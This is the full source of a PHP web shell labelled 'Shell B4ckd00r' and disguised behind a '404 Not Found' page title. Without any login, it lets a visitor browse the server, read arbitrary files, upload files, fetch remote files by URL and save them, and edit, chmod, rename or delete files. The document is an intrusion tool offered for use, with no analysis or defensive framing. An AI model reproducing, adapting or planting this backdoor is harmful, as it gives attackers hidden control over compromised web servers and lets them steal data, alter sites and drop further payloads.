<html>
  <head>
  <link href='http://res7ock.org/assets/img/favicon.png' rel='shortcut icon' alt='icon'>
  <title>404 Not Found</title>
<center><h1><font face="Sarpanch">Shell B4ckd00r</h1></center>
  <meta name='author' content='404'>
  <meta charset="UTF-8">
  <link href="" rel="stylesheet" type="text/css">

<style>
body{
font-family: "Sarpanch", cursive;
	color:white;
	background-attachment:fixed;
	background-repeat:no-repeat;
	background-position:center;
	background-color:#242323;
	-webkit-background-size: 100% 100%;
}
#content tr:hover{
background-color: #5ddcfc;
text-shadow:1px 0px 0px #000;
}
#content .first{
background-color: #5ddcfc;
font-weight: bold;
}
H1{
color:#5ddcfc;
font-family: "Sarpanch", cursive;
}
#content .first:hover{
background-color: #5ddcfc;
text-shadow:1px 0px 0px #000;
}
table{
border: 0px white solid;
}
a{
color: white;
text-decoration: none;
}
a:hover{
color: white;
text-shadow:1px 0px 0px #000;
}
.tombols{
background:black;
color:#5ddcfc;
border-top:0;
border-left:0;
border-right:0;
border: 2px white solid;
padding:5px 8px;
text-decoration:none;
font-family: 'Sarpanch', sans-serif;
border-radius:5px;
}
textarea{
color:#5ddcfc;
background-color:transparent;
font-weight: bold;
padding:5px 8px;
font-family: "Sarpanch", cursive;
border: 2px white solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
input,select{
color:#5ddcfc;
background-color:black;
font-weight: bold;
font-family: "Sarpanch", cursive;
border: 2px white solid;
}
</style>
</head>


<link href="https://fonts.googleapis.com/css?family=Courgette" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Sarpanch|Teko" rel="stylesheet">

<?php
error_reporting(0);

$nick = "404";
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$software = getenv("SERVER_SOFTWARE");
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);


if(!function_exists('posix_getegid')) {
    $user = @get_current_user();
    $uid = @getmyuid();
    $gid = @getmygid();
    $group = "?";
} else {
    $uid = @posix_getpwuid(posix_geteuid());
    $gid = @posix_getgrgid(posix_getegid());
    $user = $uid['name'];
    $uid = $uid['uid'];
    $group = $gid['name'];
    $gid = $gid['gid'];
} 


echo "<br><b><i><center><font color=#5ddcfc size=3>Current Dir : </font>";
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '"><font color=white size=3>'.$pat.'</font></a>/';
}

##TOOLBAR
echo "<hr color=#5ddcfc>
<br><center>
<font size=3><a href='?' class='tombols'>Home</a>
<font size=3><a href='?path=$path&a=upload' class='tombols'>Upload</a>
<font size=3><a href='?path=$path&a=mkdir' class='tombols'>Create Dir</a>
<font size=3><a href='?path=$path&a=wget' class='tombols'>Create File</a>
<font size=3><a href='?path=$path&a=curl' class='tombols'>Curl</a>

</center></br>
<hr color=#5ddcfc><center>";

if(isset($_GET['a']) && $_GET['a'] == 'mkdir') {
    if(isset($_POST['dir_name'])) {
        $dir_name = $_POST['dir_name'];
        if(!empty($dir_name)) {
            $new_dir_path = $path.'/'.$dir_name;
            if(mkdir($new_dir_path, 0755)) {
                echo '<font color="#5ddcfc">Direktori ' . $dir_name . ' created successfully!</font><br />';
            } else {
                echo '<font color="red">Failed to create directory ' . $dir_name . '</font><br />';
            }
        } else {
            echo '<font color="red">The directory name cannot be empty!</font><br />';
        }
    }

    echo '<form method="POST">
        Directory Name: <input type="text" name="dir_name" />
        <input type="submit" value="Create Directory" />
    </form><br />';
}

elseif (isset($_GET['a']) && $_GET['a'] == 'curl') {
    if (isset($_POST['url']) && isset($_POST['filename'])) {
        $url = $_POST['url'];
        $filename = $path . '/' . $_POST['filename'];

        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);

        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        } else {
            file_put_contents($filename, $response);
            echo 'file has been created successfully.';
        }

        curl_close($ch);
    }

    echo '<form method="POST">
        URL: <input type="text" name="url"> 
        Filename: <input type="text" name="filename">
        <input type="submit" value="Submit">
    </form>';
}

elseif (isset($_GET['a']) && $_GET['a'] == 'wget') {
    if (isset($_POST['url']) && isset($_POST['filename'])) {
        $url = $_POST['url'];
        $filename = $path . '/' . $_POST['filename'];

        $wget = file_get_contents($url);

        file_put_contents($filename, $wget);

        if(file_exists($filename)) {
            echo 'file has been created successfully.';
        } else {
            'failed';
        }
    }
    echo '<form method="POST">
    URL: <input type="text" name="url"> 
    Filename: <input type="text" name="filename">
    <input type="submit" value="Submit">
</form>';
}
//uploads
elseif($_GET['a'] == 'upload') {
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="#5ddcfc">Success!</font><br />';
}else{
echo '<font color="white">Failed!</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST"><font color="white" size="4">
Upload File :<br><input type="file" name="file" />
<input type="submit" value="Upload" />
</form><br>
</td></tr>';	

//START
} elseif(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo(' <center><textarea style="width:80%;height:50%;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea></center>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br />'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#5ddcfc">Change permission successfully</font><br />';
}else{
echo '<font color="white">change permission failed</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Chmod" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="#5ddcfc">Rename successfully</font><br />';
}else{
echo '<font color="white">Rename failed</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
Nama Baru : <input name="newname" type="text" size="30" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Rename" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="#5ddcfc">Edit file successfully</font><br />';
}else{
echo '<font color="white">Edit file failed</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=140 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Edit File" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="#5ddcfc">Directory Deleted</font><br />';
}else{
echo '<font color="red">Failed to delete</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="#5ddcfc">File Deleted</font><br />';
}else{
echo '<font color="#red">Failed to delete</font><br />';
}
}
}
		
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700px" border="0" cellpadding="4" cellspacing="1" align="center">
<tr class="first">
<b><td><center><font color=black size=3>Name</font></center></td></b>
<b><td><center><font color=black size=3>Size</font></center></td></b>
<b><td><center><font color=black size=3>Permissions</font></center></td></b>
<b><td><center><font color=black size=3>Options</font></center></td></b>
</tr>';

foreach($scandir as $dir){
if(!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>
<a href=\"?path=$path/$dir\"><font color=#5ddcfc>$dir</font></a></td>
<td><center><font color=white>Directory</font></center></td>
<td><center>";
	
if(is_writable("$path/$dir")) echo '<font color="#5ddcfc">';
elseif(!is_readable("$path/$dir")) echo '<font color="red">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"Select\">Select</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='>
<a href=\"?filesrc=$path/$file&path=$path\"><font color=white>$file</font></a></td>
<td><center><font color=#5ddcfc>".$size."</font></center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color=#5ddcfc>';
elseif(!is_readable("$path/$file")) echo '<font color=red>';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"Select\">Select</option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br /><center><font color="#5ddcfc">v.01</font></br>

</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
